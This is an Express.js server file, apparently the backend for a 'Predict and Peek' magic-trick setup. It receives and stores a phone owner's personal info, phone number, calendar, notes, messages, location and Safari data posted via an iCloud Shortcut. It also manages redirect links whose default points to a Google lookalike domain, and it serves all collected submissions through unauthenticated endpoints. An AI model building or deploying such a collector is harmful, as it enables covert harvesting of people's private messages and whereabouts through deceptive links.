const express = require('express');
const path = require('path');
const fs = require('fs');
const mongoose = require('mongoose');

const app = express();

// 15mb limit supports base64 images plus standard JSON requests
app.use(express.json({ limit: '15mb' }));

// Built-in CORS & Safari Cache-Control headers
app.use((req, res, next) => {
  res.set({
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type, Authorization',
    'Cache-Control': 'no-store, no-cache, must-revalidate, proxy-revalidate',
    'Pragma': 'no-cache',
    'Expires': '0'
  });
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});

// ==================================================
// 0. MONGODB ATLAS CONNECTION (FOR PERMANENT LINKS)
// ==================================================
const MONGO_URI = process.env.MONGO_URI;

if (!MONGO_URI) {
  console.warn('WARNING: MONGO_URI environment variable is not set!');
} else {
  mongoose.connect(MONGO_URI)
    .then(() => console.log('Connected to MongoDB Atlas'))
    .catch(err => console.error('MongoDB connection error:', err));
}

const portalSchema = new mongoose.Schema({
  masterRedirect: String,
  links: [{ id: String, title: String, url: String }]
});

const Portal = mongoose.model('Portal', portalSchema);

// ==================================================
// 1. KEEP-ALIVE HEALTH ROUTE
// ==================================================
app.get('/health', (req, res) => {
  res.status(200).send('OK');
});

// ==================================================
// 2. SCREENSHOT & TELEMETRY RECEIVER ROUTES
// ==================================================
const SUBMISSIONS_FILE = path.join(__dirname, 'submissions.json');

function getSubmissions() {
  if (!fs.existsSync(SUBMISSIONS_FILE)) {
    fs.writeFileSync(SUBMISSIONS_FILE, JSON.stringify([], null, 2));
    return [];
  }
  try {
    return JSON.parse(fs.readFileSync(SUBMISSIONS_FILE, 'utf8'));
  } catch (err) {
    return [];
  }
}

function saveSubmissions(subs) {
  fs.writeFileSync(SUBMISSIONS_FILE, JSON.stringify(subs, null, 2));
}

app.post('/api/submit', (req, res) => {
  try {
    const {
      personal_info_b64 = '',
      phone_number_b64 = '',
      calendar = '',
      cellular_plan = '',
      notes = '',
      messages = '',
      hotspot = '',
      location = '',
      safari = ''
    } = req.body || {};

    const submissions = getSubmissions();
    const newEntry = {
      id: Date.now().toString(),
      personal_info_b64,
      phone_number_b64,
      calendar,
      cellular_plan,
      notes,
      messages,
      hotspot,
      location,
      safari,
      timestamp: Date.now()
    };

    submissions.unshift(newEntry);
    saveSubmissions(submissions);

    return res.status(200).json({ success: true, message: 'Stored!', id: newEntry.id });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Server error' });
  }
});

app.get('/api/submissions', (req, res) => {
  const submissions = getSubmissions();
  return res.status(200).json({ success: true, submissions });
});

app.get('/api/latest', (req, res) => {
  const submissions = getSubmissions();
  if (submissions.length === 0) {
    return res.status(404).json({ success: false, error: 'No data yet' });
  }
  return res.status(200).json({ success: true, ...submissions[0] });
});

// ==================================================
// 3. AI SUMMARY HISTORY ROUTES
// ==================================================
const SUMMARIES_FILE = path.join(__dirname, 'summaries.json');

function getSummaries() {
  if (!fs.existsSync(SUMMARIES_FILE)) {
    fs.writeFileSync(SUMMARIES_FILE, JSON.stringify([], null, 2));
    return [];
  }
  try {
    return JSON.parse(fs.readFileSync(SUMMARIES_FILE, 'utf8'));
  } catch (err) {
    return [];
  }
}

function saveSummaries(summaries) {
  fs.writeFileSync(SUMMARIES_FILE, JSON.stringify(summaries, null, 2));
}

app.post('/api/summaries/submit', (req, res) => {
  try {
    const { text } = req.body;
    if (!text || typeof text !== 'string') {
      return res.status(400).json({ success: false, error: 'Missing or invalid text field' });
    }

    const firstLine = text.split('\n')[0].trim();
    const title = firstLine.length > 0 ? firstLine : 'Untitled Summary';
    const timestamp = Date.now();

    const summaries = getSummaries();
    const newEntry = {
      id: Date.now().toString(),
      title,
      text,
      timestamp
    };

    summaries.unshift(newEntry);
    saveSummaries(summaries);

    return res.status(200).json({ success: true, entry: newEntry });
  } catch (error) {
    return res.status(500).json({ success: false, error: 'Server error' });
  }
});

app.get('/api/summaries', (req, res) => {
  const summaries = getSummaries();
  return res.status(200).json({ success: true, summaries });
});

// ==================================================
// 4. MAGIC LINKS PORTAL ROUTES (DATABASE BACKED)
// ==================================================
async function getPortalData() {
  try {
    let data = await Portal.findOne();
    if (!data) {
      data = new Portal({
        masterRedirect: 'https://gooqlc.com/111z',
        links: [
          { id: '1', title: 'Google', url: 'https://google.com' },
          { id: '2', title: 'Predict and Peek', url: 'https://www.icloud.com/shortcuts/' }
        ]
      });
      await data.save();
    }
    return data;
  } catch (err) {
    // Fallback default if DB fails momentarily
    return {
      masterRedirect: 'https://gooqlc.com/111z',
      links: [
        { id: '1', title: 'Google', url: 'https://google.com' },
        { id: '2', title: 'Predict and Peek', url: 'https://www.icloud.com/shortcuts/' }
      ]
    };
  }
}

app.get('/', (req, res) => {
  const indexFile = path.join(__dirname, 'index.html');
  if (fs.existsSync(indexFile)) {
    res.sendFile(indexFile);
  } else {
    res.status(200).send('Server is live.');
  }
});

app.get('/app', (req, res) => {
  const appFile = path.join(__dirname, 'app.html');
  if (fs.existsSync(appFile)) {
    res.sendFile(appFile);
  } else {
    res.status(200).send('Please create app.html in your GitHub repo.');
  }
});

app.get('/api/portal', async (req, res) => {
  const data = await getPortalData();
  res.status(200).json({ success: true, masterRedirect: data.masterRedirect, links: data.links });
});

app.post('/api/save', async (req, res) => {
  try {
    const { masterRedirect, links } = req.body;
    let data = await Portal.findOne();
    if (!data) {
      data = new Portal({ masterRedirect: 'https://gooqlc.com/111z', links: [] });
    }
    if (masterRedirect) data.masterRedirect = masterRedirect;
    if (Array.isArray(links)) data.links = links;
    await data.save();
    return res.status(200).json({ success: true, data });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Database error' });
  }
});

app.all('/api/set-redirect', async (req, res) => {
  try {
    const newUrl = req.body?.url || req.query?.url;
    if (!newUrl) return res.status(400).json({ success: false, error: 'Missing url' });
    let data = await Portal.findOne();
    if (!data) {
      data = new Portal({ masterRedirect: newUrl, links: [] });
    } else {
      data.masterRedirect = newUrl;
    }
    await data.save();
    return res.status(200).json({ success: true, masterRedirect: data.masterRedirect });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Database error' });
  }
});

app.all('/api/update-link', async (req, res) => {
  try {
    const id = req.body?.id || req.query?.id;
    const newTitle = req.body?.title || req.query?.title;
    const newUrl = req.body?.url || req.query?.url;
    if (!id) return res.status(400).json({ success: false, error: 'Missing id' });

    let data = await Portal.findOne();
    if (!data) return res.status(404).json({ success: false, error: 'Portal data not found' });

    const target = (data.links || []).find(item => item.id === String(id));
    if (!target) return res.status(404).json({ success: false, error: 'Link not found' });

    if (newTitle) target.title = newTitle;
    if (newUrl) target.url = newUrl;
    await data.save();
    return res.status(200).json({ success: true, updated: target });
  } catch (err) {
    return res.status(500).json({ success: false, error: 'Database error' });
  }
});

// ==================================================
// 5. HISTORY DASHBOARD ROUTE
// ==================================================
app.get('/history', (req, res) => {
  const historyHtmlPath = path.join(__dirname, 'history.html');
  if (fs.existsSync(historyHtmlPath)) {
    res.sendFile(historyHtmlPath);
  } else {
    res.status(404).send('Please create history.html in your GitHub repo.');
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Combined server running on port ${PORT}`);
});
